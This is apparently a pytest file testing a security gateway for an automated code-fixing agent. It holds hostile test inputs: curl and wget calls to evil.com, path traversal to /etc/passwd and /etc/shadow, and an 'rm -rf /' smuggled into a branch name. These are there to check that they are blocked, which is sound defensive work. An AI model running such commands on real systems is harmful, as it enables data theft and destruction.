"""Tests for fixer_agent.security — validates the fixer-specific
security gateway permits git operations while blocking other dangerous
commands, and enforces path containment for write tools.
"""

from __future__ import annotations

import os
from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest

from fixer_agent.security import (
    _path_in_target,
    after_tool_callback,
    before_tool_callback,
    reset_session,
)


@pytest.fixture(autouse=True)
def _reset():
    reset_session()
    yield
    reset_session()


@pytest.fixture
def tool_ctx():
    return MagicMock()


def _tool(name: str) -> SimpleNamespace:
    return SimpleNamespace(name=name)


class TestFixerSecurityGateway:
    def test_allows_git_operations(self, tool_ctx):
        """git is removed from fixer denylist — should pass."""
        result = before_tool_callback(
            _tool("create_fix_branch"),
            {"branch_name": "vuln-hawk/auto-fix-123"},
            tool_ctx,
        )
        assert result is None

    def test_blocks_curl(self, tool_ctx):
        """curl should still be blocked via arg denylist patterns."""
        result = before_tool_callback(
            _tool("run_python_snippet"),
            {"code": "import subprocess; subprocess.run(['curl', 'http://evil.com'])"},
            tool_ctx,
        )
        assert result is not None
        assert result["status"] == "error"

    def test_blocks_wget_in_snippet(self, tool_ctx):
        result = before_tool_callback(
            _tool("run_python_snippet"),
            {"code": "os.system('wget http://evil.com')"},
            tool_ctx,
        )
        assert result is not None
        assert result["status"] == "error"

    def test_write_file_requires_filepath(self, tool_ctx):
        result = before_tool_callback(
            _tool("write_file"),
            {"filepath": "", "content": "x"},
            tool_ctx,
        )
        assert result is not None
        assert "filepath is required" in result["error"]

    def test_write_file_blocks_path_escape(self, tool_ctx, tmp_path, monkeypatch):
        monkeypatch.setenv("TARGET_CODEBASE_ROOT", str(tmp_path))
        result = before_tool_callback(
            _tool("write_file"),
            {"filepath": "../../etc/passwd", "content": "pwned"},
            tool_ctx,
        )
        assert result is not None
        assert "escapes target root" in result["error"]

    def test_write_file_allows_valid_path(self, tool_ctx, tmp_path, monkeypatch):
        monkeypatch.setenv("TARGET_CODEBASE_ROOT", str(tmp_path))
        (tmp_path / "app.py").write_text("x = 1")
        result = before_tool_callback(
            _tool("write_file"),
            {"filepath": "app.py", "content": "x = 2"},
            tool_ctx,
        )
        assert result is None

    def test_branch_name_validation_rejects_special_chars(self, tool_ctx):
        result = before_tool_callback(
            _tool("create_fix_branch"),
            {"branch_name": "branch; rm -rf /"},
            tool_ctx,
        )
        assert result is not None
        assert "Invalid branch name" in result["error"]

    def test_branch_name_validation_accepts_valid(self, tool_ctx):
        result = before_tool_callback(
            _tool("create_fix_branch"),
            {"branch_name": "vuln-hawk/auto-fix-2026"},
            tool_ctx,
        )
        assert result is None

    def test_git_commit_blocks_path_escape(self, tool_ctx, tmp_path, monkeypatch):
        monkeypatch.setenv("TARGET_CODEBASE_ROOT", str(tmp_path))
        result = before_tool_callback(
            _tool("git_commit"),
            {"files": "../../etc/shadow", "message": "steal"},
            tool_ctx,
        )
        assert result is not None
        assert "escapes target root" in result["error"]

    def test_rate_limit(self, tool_ctx, monkeypatch):
        import fixer_agent.security as sec
        monkeypatch.setattr(sec, "MAX_CALLS_PER_SESSION", 2)
        reset_session()
        before_tool_callback(_tool("read_file"), {"filepath": "x"}, tool_ctx)
        before_tool_callback(_tool("read_file"), {"filepath": "x"}, tool_ctx)
        result = before_tool_callback(_tool("read_file"), {"filepath": "x"}, tool_ctx)
        assert result is not None
        assert "limit exceeded" in result["error"]

    def test_credential_scrubbing(self, tool_ctx):
        tool_response = "key is AKIA1234567890123456 and ghp_abcdefghijklmnopqrstuvwxyz1234567890"
        result = after_tool_callback(_tool("read_file"), {}, tool_ctx, tool_response)
        assert result is not None
        assert "AKIA" not in result["result"]
        assert "[REDACTED]" in result["result"]

    def test_search_code_blocks_credential_patterns(self, tool_ctx):
        result = before_tool_callback(
            _tool("search_code"),
            {"pattern": "AKIA1234567890123456"},
            tool_ctx,
        )
        assert result is not None
        assert "Credential pattern" in result["error"]


class TestPathContainment:
    def test_path_in_target_valid(self, tmp_path, monkeypatch):
        monkeypatch.setenv("TARGET_CODEBASE_ROOT", str(tmp_path))
        (tmp_path / "app.py").write_text("x = 1")
        assert _path_in_target("app.py") is True

    def test_path_in_target_escape(self, tmp_path, monkeypatch):
        monkeypatch.setenv("TARGET_CODEBASE_ROOT", str(tmp_path))
        assert _path_in_target("../../etc/passwd") is False

    def test_path_in_target_subdirectory(self, tmp_path, monkeypatch):
        monkeypatch.setenv("TARGET_CODEBASE_ROOT", str(tmp_path))
        sub = tmp_path / "src"
        sub.mkdir()
        (sub / "utils.py").write_text("pass")
        assert _path_in_target("src/utils.py") is True
